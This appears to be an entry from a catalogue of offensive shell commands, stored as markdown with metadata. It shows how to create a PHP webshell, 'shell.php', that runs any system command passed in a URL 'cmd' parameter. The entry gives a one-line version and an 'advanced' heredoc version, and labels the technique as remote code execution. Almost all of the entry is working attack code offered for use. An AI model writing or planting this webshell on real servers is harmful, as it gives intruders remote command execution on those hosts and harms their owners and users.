---
id: cmd-001
data: 'echo ''<?php system($_GET["cmd"]); ?>'' > shell.php'
tags:
  - php
  - rce
type: command
output: null
executor: bash
platforms:
  - Linux
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T05:32:13.743Z'
verified: false
validated: true
submitted: true
---
# create-php-shell

## Command

```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php
```

## Description

This command creates a basic PHP webshell file that allows remote command execution when accessed with a 'cmd' parameter in the URL query string.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `echo` | Outputs the PHP code | Yes |
| `> shell.php` | Redirects output to file | Yes |

## Examples

### Basic Usage

```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php
```

### Advanced Usage

```bash
cat > shell.php << EOF
<?php if(isset(\\$_GET['cmd'])) { system(\\$_GET['cmd']); } ?>
EOF
```

## Expected Output

No direct output; the file shell.php is created with the PHP code. Verify with `cat shell.php` to see the contents.

## Related

- [[Related Procedure]]
